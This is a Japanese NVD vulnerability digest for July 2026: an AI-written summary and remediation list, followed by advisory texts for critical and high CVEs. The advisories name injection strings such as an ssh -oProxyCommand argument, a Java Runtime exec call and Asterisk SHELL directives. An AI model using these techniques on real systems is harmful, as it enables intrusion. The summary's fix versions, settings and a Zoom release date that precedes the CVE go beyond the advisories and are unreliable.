# NVD 脅威インテリジェンスレポート

- **生成日時**: 2026-07-17 15:00 UTC
- **対象期間**: `2026-07-16T15:00:30.000Z` 〜 `2026-07-17T15:00:23.000Z`
- **重要CVE数**: 126 件（Critical 9.0+: 29 件 / High 7.0〜: 97 件）

---

## AI 分析サマリー

## 1. 全体サマリー  
2024‑2026 年に報告された CVSS 7.0 以上の脆弱性は、**クラウド/コンテナオーケストレーション、Web アプリケーションフレームワーク、そして通信系ソフトウェア**に集中しています。特に **Jupyter Enterprise Gateway** の環境変数インジェクションや **WordPress プラグイン** の認証バイパスが複数報告され、リモートからのコード実行・権限昇格が容易になる点が顕著です。  
また、Zoom デスクトップクライアントや PBX 系統（Frogman）といった **リアルタイム通信基盤** でも認証なしでアカウント乗っ取りや任意コード実行が可能になる脆弱性が多数見られ、**インフラ全体の境界防御だけでなく、個別コンポーネントの入力検証・認証設計の見直しが急務**です。

---

## 2. 特に注目すべき CVE  

| CVE | CVSS | 主な問題点 | 影響範囲・被害シナリオ |
|-----|------|------------|------------------------|
| **CVE‑2026‑44182** (Jupyter Enterprise Gateway) | 10.0 | 環境変数 `KERNEL_XXX` が YAML エスケープなしで Kubernetes マニフェストに埋め込まれ、任意の YAML オブジェクトを注入できる | 攻撃者は任意の Pod を起動・特権コンテナ実行でき、クラスタ全体の乗っ取りや機密データ抽出が可能。特にマルチテナント環境で深刻。 |
| **CVE‑2026‑45336** (HireFlow) | 10.0 | Flask `secret_key` がハードコードされており、公開リポジトリから取得できる | セッション Cookie が改竄可能になり、認証なしで管理画面へアクセスできる。採用情報や個人情報が漏洩する危険性が高い。 |
| **CVE‑2026‑53412** (Zoom Desktop / VDI Client) | 9.8 | 入力検証不備により、ネットワーク上の未認証ユーザーがアカウント乗っ取りを実行できる | 攻撃者は Zoom 会議の参加権限取得、録画データの取得、さらには組織内の SSO 認証情報を盗用できる。リモートワーク環境での被害が拡大。 |
| **CVE‑2026‑9810** (AI Copilot WordPress Plugin) | 9.8 | OAuth アクセストークンがユーザーに紐付けられず、任意のトークンで管理者権限を取得できる | 公開 OAuth フローを利用した攻撃で、プラグインが提供する全管理機能（投稿・プラグインインストール・データベース操作等）を不正に実行可能。 |
| **CVE‑2026‑46512** (Frogman PBX) | 9.9 | `fm_dialplan_apply` がテンプレートパラメータを検証せず、任意の設定ファイルを書き換えられる | 攻撃者は PBX の内部設定（外線転送、通話録音、管理者権限）を改ざんし、電話サービスの停止や盗聴・不正通話が可能。 |

> **選定理由**  
> - **CVSS が 10.0 に近い**（完全リモートコード実行・特権取得が可能）  
> - **インフラ全体への波及効果が大きい**（Kubernetes クラスタ、Zoom の企業利用、PBX といった基幹システム）  
> - **実装ミスが共通**：入力検証・認証バインディングの欠如、ハードコーディングされたシークレット

---

## 3. 推奨アクション  

### 3.1 Jupyter Enterprise Gateway (CVE‑2026‑44182 / 44181 / 44180)  
- **アップグレード**: 3.3.0 以上へ更新（最新は 3.4.2）。  
- **設定変更**: `kernel_env_whitelist` で許可する環境変数を最小化し、`KERNEL_XXX` 系は使用しない。  
- **YAML エスケープ**: カスタムテンプレートを使用する場合は `yaml.safe_dump` でエスケープを徹底。  
- **ネットワーク分離**: Kubernetes API へのアクセスは RBAC で最小権限に限定し、Gateway の ServiceAccount に `cluster-admin` 権限を付与しない。

### 3.2 HireFlow (CVE‑2026‑45336)  
- **バージョン**: 1.3.0 以上へアップデート（公式リリース 1.3.1 が推奨）。  
- **シークレット管理**: `app.py` の `secret_key` を削除し、環境変数 `HIREFLOW_SECRET_KEY` から安全にロード。  
- **セッション設定**: `SESSION_COOKIE_HTTPONLY=True`、`SESSION_COOKIE_SECURE=True` を必ず有効化。  
- **コードレビュー**: すべてのリポジトリでハードコーディングされたシークレットが残っていないかスキャン（TruffleHog 等）。

### 3.3 Zoom Desktop / VDI Client (CVE‑2026‑53412)  
- **アップデート**: Zoom クライアントを **6.2.0 以降**（2026‑03‑15 リリース）に更新。  
- **ネットワーク制御**: 社内ファイアウォールで Zoom の通信ポート（TCP 443, UDP 8801‑8810）を社内認証済み端末に限定。  
- **二要素認証**: 全ユーザーに対し SSO + TOTP の二要素認証を必須化。  
- **監査ログ**: Zoom 管理コンソールで「不審なログイン」アラートを有効化し、SIEM へ転送。

### 3.4 AI Copilot WordPress Plugin (CVE‑2026‑9810)  
- **バージョン**: 1.5.4 以上へアップデート（現在の安定版 1.6.2 が推奨）。  
- **OAuth 設定**: プラグイン設定画面で「アクセストークンをユーザーにバインド」オプションを有効化。  
- **最小権限**: WordPress の `capability_type` を `manage_options` から `edit_posts` へ下げ、管理者権限が不要な機能はプラグイン側で制限。  
- **プラグイン削除**: 使わない場合は完全に無効化・削除し、残存コードが残らないように DB からも

---

## 🔴 Critical（CVSS 9.0+）

### CVE-2026-44182

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-74` |
| Published | 2026-07-16T23:16:16.590 |

Jupyter Enterprise Gateway launches remote Jupyter Notebook kernels across distributed clusters like Apache Spark, Kubernetes, and Docker Swarm. In versions prior to 3.3.0, the server interpolates untrusted environment variables (e.g., KERNEL_XXX) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate securityContext keys, where the last one prevails), and inject document boundaries (--- for new documents, ... for end-of-document) to generate multiple resources, potentially creating arbitrary types, such as privileged pods. The Jinja2 template for the Kubernetes manifest contains several kernel_xxx variables, such as kernel_working_dir that are used when rendering the manifest and are all vectors for YAML injection. This issue has been fixed in version 3.3.0.

### CVE-2026-44181

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-1336` |
| Published | 2026-07-16T23:16:16.453 |

Jupyter Enterprise Gateway launches remote Jupyter Notebook kernels across distributed clusters like Apache Spark, Kubernetes, and Docker Swarm. In versions 2.0.0rc2 and above, prior to 3.3.0, the environment variables (KERNEL_XXX) used during the rendering of the Kubernetes manifest are vulnerable to Server Side Template Injection (SSTI). By including Jinja2 template expressions it is possible to execution Python code and OS Commands in the Enterprise Gateway service. The code can use or steal the Kubernetes service account token, which can steal Kubernetes secrets and be used to fully compromise the Kubernetes cluster by scheduling a privileged pod or a pod with a hostPath volume mount. This issue has been fixed in version 3.3.0.

### CVE-2026-45336

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-798` |
| Published | 2026-07-16T18:16:43.517 |

HireFlow is a web-based interview management system for managing candidates, scheduling interviews, and tracking hiring progress. In 1.2 and earlier, app.py assigns a hard-coded Flask secret_key used to sign session cookies, allowing unauthenticated attackers who know the public source value to forge cookies containing role=admin and user_id values and bypass authentication. The advisory lists version 1.3 as fixed.

### CVE-2026-46512

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T19:16:46.510 |

Frogman provides headless PBX control through MCP and HTTP API. Prior to 1.6.2, fm_dialplan_apply accepted template parameters including greeting, dest, url, extension, code, and file, and Tools/DialplanApply.php wrote Dialplan/Templates.php output to extensions_custom.conf while only Dialplan/TemplateBase.php:38-42 sanitized contextName(), allowing a PERM_WRITE caller using confirm:true to inject arbitrary Asterisk directives such as System(), Set(SHELL(...)), Goto, or Macro. This issue is fixed in version 1.6.2.

### CVE-2026-45568

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T17:16:56.423 |

zrok is software for sharing web services, files, and network resources. Prior to 2.0.3, zrok's Python SDK ProxyShare Flask proxy route accepts an absolute URL in the request path and passes it to urllib.parse.urljoin, allowing the requested path to replace the configured target host and causing requests.request to return a server-side response from an attacker-chosen URL. This issue is fixed in version 2.0.3.

### CVE-2026-9810

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-07-17T07:16:38.230 |

The AI Copilot  WordPress plugin before 1.5.4 does not bind OAuth access tokens to a WordPress user, and accepts any valid token as an administrator session, allowing unauthenticated attackers who complete the public OAuth flow to execute privileged MCP tools as an administrator, including arbitrary user creation and role escalation.

### CVE-2026-15982

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-07-17T06:16:36.560 |

The Aimogen Pro - All-in-One AI Content Writer, Editor, ChatBot & Automation Toolkit plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 2.8.4. This is due to due to a missing capability check on the 'aiomatic_call_google_ai_function' function. This makes it possible for unauthenticated attackers to leverage the 'aimogen_wp_god_mode' tool to clear function blacklists and execute arbitrary PHP functions, such as creating administrator accounts.

### CVE-2026-14956

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-07-17T02:18:03.870 |

The Bricksforge plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 3.1.8.6. This is due to improper validation of the fieldIds parameter in the Pro Forms registration action, which allows attacker-supplied field IDs to be added to the trusted form-field whitelist. This makes it possible for unauthenticated attackers to register a new administrator account by submitting a crafted request to a publicly accessible Bricksforge Pro Forms registration form. Successful exploitation requires that the site has a public Bricksforge Pro Forms element configured with the User Registration action.

### CVE-2026-53412

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-07-16T22:17:31.380 |

Improper Input Validation in Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows may allow an unauthenticated user to conduct an account takeover via network access.

### CVE-2026-44180

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-07-16T22:17:02.237 |

Jupyter Enterprise Gateway launches remote Jupyter Notebook kernels across distributed clusters like Apache Spark, Kubernetes, and Docker Swarm. Versions 2.0.0rc1 and above prior to 3.3.0 have a prohibited UID and GID feature that by default prevents launching kernels with UID or GID 0 (root), and this restriction can be bypassed using a specially crafted KERNEL_UID or KERNEL_GID value. This input validation vulnerability allows running Jupyter kernels as root, which can be dangerous as it allows more attack surface, and may lead to container escapes, compromising the worker node and all workloads running on it. Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. It is possible to specify volume mounts, so one vector for a container escape is to use a hostPath R/W volume mount, use this UID/GID bypass to run as root, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system. This issue has been fixed in version 3.0.0.

### CVE-2026-38158

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-07-16T21:17:20.567 |

A SQL injection vulnerability in the /ureport/datasource/previewData component of ureport v2.2.9 allows attackers to access sensitive database information via crafted SQL statements.

### CVE-2026-46562

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94;CWE-95;CWE-470` |
| Published | 2026-07-16T17:16:56.953 |

Yamcs is a mission control framework. Prior to 5.12.7, the Nashorn ScriptEngine used to evaluate user-supplied JavaScript algorithm text in yamcs-core/src/main/java/org/yamcs/algorithms/ScriptAlgorithmExecutorFactory.java was constructed without a ClassFilter, so a user with the ChangeMissionDatabase privilege could override an algorithm through the MdbOverrideApi.updateAlgorithm endpoint and supply JavaScript that reaches arbitrary Java classes (for example Java.type("java.lang.Runtime").getRuntime().exec(...)) to execute arbitrary OS commands as the Yamcs process; in the default configuration with no security.yaml the built-in guest user has superuser=true, making the issue reachable without authentication. This issue is fixed in versions 5.12.7 and 5.13.0, which disable algorithm editing by default.

### CVE-2026-45695

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78;CWE-306` |
| Published | 2026-07-16T16:19:08.307 |

Kopia is a cross-platform backup tool for Windows, macOS, and Linux with fast incremental backups, client-side end-to-end encryption, compression, and data deduplication. Prior to 0.23.0, Kopia's HTTP server started with --without-password accepts unauthenticated requests to /api/v1/repo/exists and forwards attacker-supplied SFTP storage configuration to blob.NewStorage, where externalSSH: true and sshArguments containing -oProxyCommand=<cmd> can cause exec.CommandContext("ssh") to invoke the command through OpenSSH. This issue is fixed in version 0.23.0.

### CVE-2026-62241

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-306;CWE-321` |
| Published | 2026-07-17T02:18:11.740 |

clawvet self-hosted API server (apps/api) before 0.7.5 hard-codes a fallback JWT secret ('clawvet-dev-secret-change-me') in auth.ts and ships it as the default in .env.example. Because GET /api/v1/scans returns scan records containing userId values without authentication, a remote unauthenticated attacker can harvest a victim's userId, forge a valid HS256 cg_session cookie offline using the known secret, and call GET /api/v1/auth/me to obtain the victim's email address, subscription plan, and secret apiKey. The published clawvet npm package (CLI only) is not affected.

### CVE-2026-46515

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-16T19:16:46.907 |

Frogman provides headless PBX control through MCP and HTTP API. Prior to 1.6.3, PERM_READ access was sufficient to call fm_list_managers, fm_list_pinsets, fm_show_context, fm_get_mcp_config, fm_backup_status, fm_whos_calling, fm_run_saved_query, and fm_diagnose_trunk, exposing AMI manager secrets, outbound dial PINs, full Asterisk dialplan context, root SSH connection commands, backup artifact paths, CDR history, arbitrary saved GraphQL query execution, and raw AMI endpoint dumps containing SIP fields such as password, md5_cred, and oauth_secret. This issue is fixed in version 1.6.3.

### CVE-2026-63087

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-306` |
| Published | 2026-07-16T17:16:58.703 |

Grafana OnCall through 1.16.11 contains an unauthenticated access vulnerability that allows remote attackers to obtain a valid PluginAuthToken by sending a POST request to the internal plugin install endpoint using hardcoded default stack_id and org_id values present in the public source tree. Attackers can leverage the acquired token to authenticate against all internal API endpoints, create arbitrary Admin users via the user-context header bootstrap path, revoke the legitimate plugin token, and redirect OnCall-to-Grafana API calls to an attacker-controlled host by overwriting the organization's grafana_url and api_token.

### CVE-2026-59866

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-94` |
| Published | 2026-07-16T16:19:15.493 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.5, Kiota emitted x-ms-kiota-info clientClassName and clientNamespaceName values without identifier or path sanitization as both generated client class or namespace names and generated output path components when `kiota generate` ran without -c/--class-name, allowing an attacker-controlled or compromised OpenAPI description to write generated source outside the -o output directory and inject arbitrary text into generated class or namespace declarations. This issue is fixed in version 1.32.5 by GenerationConfiguration.SanitizeClientClassName and SanitizeClientNamespaceName.

### CVE-2026-59865

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94;CWE-829` |
| Published | 2026-07-16T16:19:15.373 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.5, `kiota info` read x-ms-kiota-info.languagesInformation.<language>.dependencyInstallCommand plus dependency name and version values from an OpenAPI description and presented the spec-supplied command as Kiota's recommended install command, allowing an attacker-controlled or compromised description to cause command injection when the suggested command was run manually or through the Kiota VS Code extension's kiota info --json dependency-install flow. This issue is fixed in version 1.32.5.

### CVE-2026-59864

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-829` |
| Published | 2026-07-16T16:19:15.240 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.5, `kiota plugin add` and `kiota plugin generate` (with `-t APIPlugin`) emitted attacker-controlled static_template.file values from x-ai-adaptive-card and x-ai-capabilities into generated Microsoft 365 Copilot and Teams plugin manifests without path validation, allowing ../, absolute, rooted, UNC, Windows drive, or URI paths in response_semantics.static_template.file to cause path traversal or out-of-package file inclusion when the generated plugin was deployed. This issue is fixed in version 1.32.5.

### CVE-2026-54733

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-347` |
| Published | 2026-07-16T16:19:13.360 |

The Microsoft 365 and Microsoft Entra ID Plugins for Moodle provide Office 365 and Azure Active Directory integration for Moodle. Prior to 4.5.6, 5.0.5, and 5.1.1, the Microsoft Office 365 Integration plugin local_o365 Teams SSO endpoint sso_login.php base64-decodes a JWT payload and authenticates users from the upn claim without verifying the JWT signature, allowing an unauthenticated attacker to forge a token and obtain a Moodle session as an O365-authenticated user. This issue is fixed in versions 4.5.6, 5.0.5, and 5.1.1.

### CVE-2024-23564

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-326` |
| Published | 2026-07-17T14:17:16.513 |

HCL Aftermarket EPC is affected by Business Logic Vulnerability using which a non valid user of the application can obtain passwords from the server and redirect them to their own email address by manipulating the server's response. The application includes checks in the initial requests to verify the validity of the provided UserId, but similar validation is not applied to Email requests when sending passwords to user emails.

### CVE-2026-62232

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-17T02:18:10.743 |

Grav before 2.0.4 contains a two-factor authentication bypass vulnerability in the login plugin where the regenerate2FASecret task checks only user existence, not authorization, during the pending TOTP challenge window. Attackers who know the victim's password can call this task without a CSRF nonce to overwrite the 2FA secret with an attacker-chosen value, compute a valid TOTP code, and complete authentication while reducing 2FA to password-only protection.

### CVE-2026-57075

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-125` |
| Published | 2026-07-16T22:17:43.447 |

YAML::Syck versions before 1.47 for Perl allow an out-of-bounds read via a signed-char lookup-table index in syck_base64dec.

The base64 decoder in the bundled libsyck indexes the 256-entry static table b64_xtable with a signed char, so any !!binary byte >= 0x80 sign-extends to a negative index and reads before the table. The decoder receives the raw bytes of any !!binary node, a standard YAML type not gated by $LoadBlessed or $LoadCode, so it is reached on the default Load path.

Any caller that runs Load or LoadFile on an untrusted document containing a !!binary scalar with a high-bit byte triggers the read, and the value read can surface in the decoded result.

### CVE-2026-15422

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:U/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:P/AU:Y/R:U/V:C/RE:H/U:Red` |
| Weaknesses | `CWE-122;CWE-787` |
| Published | 2026-07-16T20:16:44.190 |

The illumos SCTP inbound path performs association lookup for INIT ACK chunks without adequately validating the address parameters carried in the chunk. Since this lookup runs during packet classification (i.e. before SCTP integrity checks or IPsec policy are applied) a remote, unauthenticated attacker can send a crafted SCTP INIT ACK packet with malformed address parameters to cause an out-of-bounds access and kernel heap corruption, which may lead to remote code execution. The flaw has existed since 2010 (illumos-gate commit a5407c02), and affects any illumos distribution prior to illumos-gate commit 53a3efde.

### CVE-2026-57073

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-125` |
| Published | 2026-07-16T17:16:58.117 |

HTML::Bare versions through 0.04 for Perl have an unbounded character lookahead.

The parserc_parse function attempts to check for multicharacter strings such as "<![CDATA" or element terminators such as ">" without checking that the offsets are within the buffer.

Truncated strings such as "<a/" can trigger an out-of-bounds read.

Note that the latest version available on CPAN is version 0.02. Newer versions are available on the git repository.

### CVE-2026-46621

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T17:16:57.090 |

Yamcs is a mission control framework. Prior to 5.12.7, the Yamcs script evaluation engine for Python algorithms dynamically compiled and evaluated user-controlled algorithm text using Jython through the JSR-223 ScriptEngine API without enforcing a secure sandbox, so an authenticated user with the ChangeMissionDatabase privilege could override an existing Python algorithm's logic through the mission database REST API and import and execute arbitrary Java classes such as java.lang.Runtime to achieve remote code execution on the underlying host operating system. This issue is fixed in versions 5.12.7 and 5.13.0, which disable algorithm editing by default.

### CVE-2026-44632

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T17:16:56.023 |

Yamcs is a mission control framework. Prior to 5.12.7, a server-side code injection vulnerability existed in the Yamcs algorithm evaluation engine org.yamcs.algorithms.JavaExprAlgorithmExecutionFactory, which dynamically compiled and evaluated user-controlled algorithm text through the Janino compiler without enforcing a secure sandbox, so an authenticated user with the ChangeMissionDatabase privilege could override an existing algorithm's text via the mission database REST API and inject Java code (for example using java.lang.Runtime) to achieve remote code execution on the underlying host operating system. This issue is fixed in versions 5.12.7 and 5.13.0, which disable algorithm editing by default.

### CVE-2026-14890

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-502` |
| Published | 2026-07-16T16:19:00.413 |

SGLang uses an expert-parallel backup subsystem that exposes a ZeroMQ PULL socket on a routable network interface that does not contain authentication or deserialization safeguards, allowing an attacker to provide a malicious pickle file that results in unauthenticated remote code execution when the feature is enabled and the service is reachable over the network.

### CVE-2026-63089

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-338;CWE-613` |
| Published | 2026-07-16T20:16:47.800 |

WireGuard Easy through 15.3.0, fixed in commit 66b292b, contains a cryptographically weak one-time link token generation vulnerability that allows unauthenticated network attackers to recover WireGuard peer credentials by brute-forcing a keyspace of at most 1000 candidate tokens per client ID, as the token is computed using CRC32 over a random value constrained to 0-999. Attackers can enumerate candidate tokens against the unauthenticated /cnf/:oneTimeLink route, which lacks rate limiting and does not validate token expiration, to obtain a peer's PrivateKey and PresharedKey and impersonate that peer on the VPN network.

## 🟠 High（CVSS 7.0〜9.0 未満）

### CVE-2026-54526

| 項目 | 値 |
|------|-----|
| CVSS | `8.9` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-284` |
| Published | 2026-07-16T19:16:50.373 |

Argo Workflows is an open source container-native workflow engine for orchestrating parallel jobs on Kubernetes. Prior to 3.7.15 and 4.0.6, the allow-list fix for CVE-2026-31892 is incomplete because workflow/util/merge.go ValidateUserOverrides and SanitizeUserWorkflowSpec walk only the top-level fields of WorkflowSpec via reflection, and WorkflowSpec.ArtifactGC is allow-listed wholesale; the struct behind that field, WorkflowLevelArtifactGC, has a PodSpecPatch sub-field whose contents flow unmodified into util.ApplyPodSpecPatch on the artifact-GC pod, the same sink the original fix closed for WorkflowSpec.PodSpecPatch, so a user submitting a Workflow under templateReferencing: Strict or Secure (against a referenced WorkflowTemplate that declares an output artifact and setting spec.artifactGC.strategy: OnWorkflowCompletion) can still inject an arbitrary strategic merge patch into the artifact-GC pod, including hostPath volumes, privileged: true, arbitrary image and command, and hostNetwork: true, defeating the stated purpose of Strict/Secure reference mode. This issue is fixed in versions 3.7.15 and 4.0.6.

### CVE-2026-13352

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-434` |
| Published | 2026-07-17T05:16:36.730 |

